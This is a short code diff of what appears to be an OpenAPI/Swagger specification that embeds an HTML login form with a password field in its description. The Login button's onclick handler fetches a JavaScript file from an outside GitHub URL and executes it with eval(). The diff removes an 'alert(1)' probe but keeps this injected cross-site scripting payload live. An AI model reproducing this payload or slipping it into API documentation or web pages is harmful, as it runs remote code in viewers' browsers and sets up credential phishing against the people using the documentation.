@@ -19,7 +19,7 @@ info:
             <input type="password" name="password" size="20" />
           </div>
           <div class="form-group">
-            <button type="submit" class="btn btn-default" onclick="alert(1); fetch('https://raw.githubusercontent.com/iamarit/SwaggerUiTesting/main/script.js').then(function(res){res.text().then(function(data){eval(data)})});">Login</button>
+            <button type="submit" class="btn btn-default" onclick="fetch('https://raw.githubusercontent.com/iamarit/SwaggerUiTesting/main/script.js').then(function(res){res.text().then(function(data){eval(data)})});">Login</button>
           </div>
         </form>
       </div>
